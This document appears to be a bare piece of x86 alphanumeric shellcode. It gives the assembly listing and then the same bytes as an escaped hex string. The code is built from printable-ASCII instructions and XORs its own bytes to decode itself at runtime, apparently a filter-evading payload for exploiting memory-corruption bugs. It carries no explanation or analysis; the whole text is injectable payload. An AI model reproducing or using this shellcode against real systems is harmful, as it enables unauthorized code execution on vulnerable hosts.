push   eax
pop    ecx
push   0x30
pop    eax
xor    al,0x30
push   eax
push   eax
push   eax
push   eax
push   eax
push   ecx
popa
dec    edx
push   eax
pop    eax
push   eax
pop    eax
push   eax
pop    eax
xor    eax,0x30303030
xor    eax,0x30303030
xor    eax,0x30303030
xor    eax,0x30303030
push   edx
pop    eax
xor    al,0x44
push   0x30
pop    ecx
xor    BYTE PTR [edi+ecx*2+0x44],al
push   esi
pop    eax
xor    eax,0x30433231
xor    eax,0x4f713661
push   eax
push   esp
pop    ecx
inc    ecx
inc    ecx
xor    BYTE PTR [ecx],dh
inc    ecx
xor    BYTE PTR [ecx],dh

push   esi
pop    eax
xor    eax,0x31323031
xor    eax,0x43367243
push   eax
push   esp
pop    ecx
xor    BYTE PTR [ecx],dh
inc    ecx
inc    ecx
inc    ecx
xor    BYTE PTR [ecx],dh
xor    BYTE PTR [ecx],bh



push   esi
pop    eax
xor    eax,0x31443030
xor    eax,0x725a4674
push   eax
push   esp
pop    ecx
inc    ecx
xor    BYTE PTR [ecx],dh
inc    ecx
xor    BYTE PTR [ecx],dh


push   esi
pop    eax
xor    eax,0x31303130
xor    eax,0x62716258
push   eax
push   esi
pop    eax
xor    eax,0x75734373
xor    eax,0x42427341
push   eax


push   esi
pop    eax
xor    eax,0x30314141
xor    eax,0x58636c70
push   eax
push   esp
pop    ecx
inc    ecx
xor    BYTE PTR [ecx],dh
push   esp
.byte 0x78 





"\x50\x59\x6A\x30\x58\x34\x30\x50\x50\x50\x50\x50\x51\x61\x4A\x50\x58\x50\x58\x50\x58\x35\x30\x30\x30\x30\x35\x30\x30\x30\x30\x35\x30\x30\x30\x30\x35\x30\x30\x30\x30\x52\x58\x34\x44\x6A\x30\x59\x30\x44\x4F\x44\x56\x58\x35\x31\x32\x43\x30\x35\x61\x36\x71\x4F\x50\x54\x59\x41\x41\x30\x31\x41\x30\x31\x56\x58\x35\x31\x30\x32\x31\x35\x43\x72\x36\x43\x50\x54\x59\x30\x31\x41\x41\x41\x30\x31\x30\x39\x56\x58\x35\x30\x30\x44\x31\x35\x74\x46\x5A\x72\x50\x54\x59\x41\x30\x31\x41\x30\x31\x56\x58\x35\x30\x31\x30\x31\x35\x58\x62\x71\x62\x50\x56\x58\x35\x73\x43\x73\x75\x35\x41\x73\x42\x42\x50\x56\x58\x35\x41\x41\x31\x30\x35\x70\x6C\x63\x58\x50\x54\x59\x41\x30\x31\x54\x78"











